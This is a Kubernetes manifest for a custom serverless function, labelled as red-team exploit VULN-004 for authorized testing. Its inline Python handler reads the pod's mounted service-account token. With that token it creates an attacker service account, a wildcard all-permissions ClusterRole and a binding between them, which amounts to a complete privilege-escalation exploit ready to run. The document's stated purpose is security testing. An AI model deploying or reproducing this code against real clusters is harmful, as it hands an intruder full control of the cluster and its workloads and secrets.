# VULN-004: RBAC Privilege Escalation - Create Cluster Admin
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit creates a cluster-admin equivalent role and binds it
# to an attacker-controlled service account.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-004-create-cluster-admin
  labels:
    redteam: "true"
    exploit: "vuln-004"
    target: "cluster-admin"
  annotations:
    redteam.knative.io/description: "Create cluster-admin ClusterRoleBinding"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """Create cluster-admin role and binding"""
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # Step 1: Create attacker service account
                sa = {
                    "apiVersion": "v1",
                    "kind": "ServiceAccount",
                    "metadata": {
                        "name": "attacker-sa",
                        "namespace": "default"
                    }
                }
                
                sa_url = f"{K8S_API}/api/v1/namespaces/default/serviceaccounts"
                sa_req = urllib.request.Request(
                    sa_url,
                    data=json.dumps(sa).encode('utf-8'),
                    method='POST',
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    }
                )
                try:
                    urllib.request.urlopen(sa_req, context=ssl_context)
                except urllib.error.HTTPError:
                    pass  # SA might already exist
                
                # Step 2: Create cluster-admin equivalent ClusterRole
                cluster_role = {
                    "apiVersion": "rbac.authorization.k8s.io/v1",
                    "kind": "ClusterRole",
                    "metadata": {
                        "name": "attacker-admin"
                    },
                    "rules": [{
                        "apiGroups": ["*"],
                        "resources": ["*"],
                        "verbs": ["*"]
                    }, {
                        "nonResourceURLs": ["*"],
                        "verbs": ["*"]
                    }]
                }
                
                cr_url = f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterroles"
                cr_req = urllib.request.Request(
                    cr_url,
                    data=json.dumps(cluster_role).encode('utf-8'),
                    method='POST',
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    }
                )
                try:
                    urllib.request.urlopen(cr_req, context=ssl_context)
                except urllib.error.HTTPError:
                    pass  # Role might already exist
                
                # Step 3: Create ClusterRoleBinding
                binding = {
                    "apiVersion": "rbac.authorization.k8s.io/v1",
                    "kind": "ClusterRoleBinding",
                    "metadata": {
                        "name": "attacker-admin-binding"
                    },
                    "roleRef": {
                        "apiGroup": "rbac.authorization.k8s.io",
                        "kind": "ClusterRole",
                        "name": "attacker-admin"
                    },
                    "subjects": [{
                        "kind": "ServiceAccount",
                        "name": "attacker-sa",
                        "namespace": "default"
                    }]
                }
                
                crb_url = f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"
                crb_req = urllib.request.Request(
                    crb_url,
                    data=json.dumps(binding).encode('utf-8'),
                    method='POST',
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    }
                )
                urllib.request.urlopen(crb_req, context=ssl_context)
                
                return {
                    "status": "cluster_admin_created",
                    "sa": "default/attacker-sa",
                    "role": "attacker-admin",
                    "message": "Attacker now has cluster-admin privileges"
                }
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
